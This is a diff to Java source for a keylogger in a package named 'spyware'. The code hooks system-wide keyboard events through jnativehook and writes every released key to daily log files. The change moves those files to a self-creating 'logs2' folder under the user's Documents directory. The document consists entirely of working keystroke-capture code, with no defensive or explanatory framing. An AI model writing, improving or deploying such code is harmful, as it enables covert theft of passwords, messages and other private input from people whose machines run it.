@@ -1,6 +1,7 @@
 package spyware;
 
 import java.io.BufferedWriter;
+import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
 import java.time.LocalDate;
@@ -16,6 +17,7 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
 public class Keylogger  implements NativeKeyListener{
 	
+     private static String LOG_DIRECTORY = System.getProperty("user.home") + File.separator + "Documents" + File.separator + "logs2";
 	 private static String LOG_FILE_PATH;
 	 private static LocalDate currentDate;
 	 
@@ -26,12 +28,18 @@ public class Keylogger  implements NativeKeyListener{
 	 private static void updateLogFilePath() {
 	        currentDate = LocalDate.now();
 	        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
-	        LOG_FILE_PATH = "C:\\Users\\User\\Documents\\logs\\log-" + currentDate.format(formatter) + ".txt";
+	        LOG_FILE_PATH = LOG_DIRECTORY + File.separator + "log-" + currentDate.format(formatter) + ".txt";
+	    }
+	 
+	 private static void createLogDirectoryIfNeeded() {
+	        File logDirectory = new File(LOG_DIRECTORY);
+	        if (!logDirectory.exists()) {
+	            logDirectory.mkdirs();
+	        }
 	    }
 
 	    @Override
 	    public void nativeKeyPressed(NativeKeyEvent e) {
-
 	        // If the Escape key is pressed, unregister the native hook
 	        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
 	            try {
@@ -43,8 +51,7 @@ public class Keylogger  implements NativeKeyListener{
 	    }
 
 	    @Override
-	    public void nativeKeyReleased(NativeKeyEvent e) {
-	        
+	    public void nativeKeyReleased(NativeKeyEvent e) {       
 	        // Write the key release event to the log file
 	        try (BufferedWriter writer = new BufferedWriter(new FileWriter(LOG_FILE_PATH, true))) {
 	            writer.write(NativeKeyEvent.getKeyText(e.getKeyCode()));
@@ -69,6 +76,8 @@ public class Keylogger  implements NativeKeyListener{
 	        ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);
 	        scheduler.scheduleAtFixedRate(() -> {
 	            try {
+	            	 createLogDirectoryIfNeeded();
+	            	
 	                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
 	                String logFilePath = "C:\\Users\\User\\Documents\\logs\\log-" + LocalDate.now().format(formatter) + ".txt";
 	                
